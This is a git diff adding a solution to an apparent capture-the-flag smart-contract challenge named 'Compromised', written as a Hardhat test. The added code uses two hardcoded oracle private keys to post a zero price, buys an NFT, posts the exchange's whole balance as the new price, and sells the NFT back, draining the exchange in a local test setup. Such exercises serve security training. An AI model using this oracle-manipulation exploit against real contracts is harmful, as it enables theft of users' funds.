@@ -1,5 +1,5 @@
 const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const { ethers, BigNumber } = require('hardhat');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('Compromised challenge', function () {
@@ -11,6 +11,8 @@ describe('Compromised challenge', function () {
         '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
         '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
     ];
+
+    
 
     const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
     const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
@@ -53,6 +55,37 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let keys = [
+            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48',
+            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
+        ]
+
+        let oracle1 = new ethers.Wallet(keys[0], ethers.provider);
+        let oracle2 = new ethers.Wallet(keys[1], ethers.provider);
+        
+        await oracle.connect(oracle1).postPrice('DVNFT', 0);
+        await oracle.connect(oracle2).postPrice('DVNFT', 0);
+
+        let playerbalance =(await ethers.provider.getBalance(player.address)).sub(ethers.utils.parseEther('0.09'));
+        console.log(playerbalance);
+
+        console.log(await oracle.getMedianPrice('DVNFT'));
+        let txResponse = await exchange.connect(player).buyOne({value: playerbalance});
+        
+        const txReceipt = await txResponse.wait();
+        const [transferEvent] = txReceipt.events;
+        //const { id } = transferEvent.args;
+
+        //console.log(transferEvent)
+        
+
+        let exbalance =await ethers.provider.getBalance(exchange.address);
+
+        await oracle.connect(oracle1).postPrice('DVNFT', exbalance);
+        await oracle.connect(oracle2).postPrice('DVNFT', exbalance);
+
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
